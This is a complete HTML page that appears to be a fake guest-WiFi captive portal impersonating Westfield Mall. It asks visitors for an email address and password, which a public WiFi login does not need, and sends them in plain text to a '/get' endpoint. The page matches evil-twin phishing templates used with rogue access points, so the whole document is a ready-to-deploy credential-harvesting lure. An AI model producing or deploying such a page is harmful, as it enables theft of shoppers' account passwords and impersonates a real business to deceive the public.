<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Westfield Mall — Guest WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f9f9f9;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:420px;background:#fff;border-radius:16px;overflow:hidden;box-shadow:0 8px 40px rgba(0,0,0,0.08)}
.top{background:linear-gradient(135deg,#1a1a2e,#16213e);padding:30px 28px 24px;text-align:center}
.mall-icon{font-size:32px;margin-bottom:10px}
.mall-name{font-size:20px;font-weight:800;color:#fff;letter-spacing:1px}
.mall-sub{font-size:10px;color:rgba(255,255,255,0.5);letter-spacing:2px;text-transform:uppercase;margin-top:5px}
.ssid-pill{display:inline-flex;align-items:center;gap:7px;background:rgba(255,255,255,0.08);border-radius:20px;padding:5px 14px;margin-top:14px;border:1px solid rgba(255,255,255,0.1)}
.dot{width:6px;height:6px;background:#4ade80;border-radius:50%}
.ssid-pill span{font-size:11px;color:rgba(255,255,255,0.5)}
.ssid-pill strong{color:rgba(255,255,255,0.8);font-weight:500}
.body{padding:26px 28px 22px}
.body h2{font-size:17px;font-weight:700;color:#1a1a2e;margin-bottom:4px}
.body .sub{font-size:12.5px;color:#bbb;margin-bottom:20px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.2px;color:#aaa;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1.5px solid #eee;border-radius:10px;font-size:14.5px;background:#fafafa;color:#1a1a2e}
input:focus{outline:none;border-color:#1a1a2e;box-shadow:0 0 0 3px rgba(26,26,46,0.06)}
input::placeholder{color:#ddd}
.btn{width:100%;padding:13px;margin-top:22px;border:none;border-radius:10px;background:#1a1a2e;color:#fff;font-size:13px;font-weight:700;cursor:pointer}
.btn:hover{background:#2a2a4e}
.terms{font-size:11px;color:#ccc;text-align:center;margin-top:14px;line-height:1.6}
.terms a{color:#1a1a2e}
.foot{background:#fafafa;border-top:1px solid #f0f0f0;padding:12px 28px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#ccc;text-decoration:none}
.foot a{color:#1a1a2e}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="mall-icon">🛍</div>
    <div class="mall-name">Westfield Mall</div>
    <div class="mall-sub">Shopping &amp; Entertainment</div>
    <div class="ssid-pill"><div class="dot"></div><span>Network: <strong>Westfield-Guest</strong></span></div>
  </div>
  <div class="body">
    <h2>Free Guest WiFi</h2>
    <p class="sub">Sign in to enjoy complimentary internet throughout the mall.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect to WiFi</button>
      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Westfield Mall Management</span><a href="#">Help</a></div>
</div>
</body>
</html>
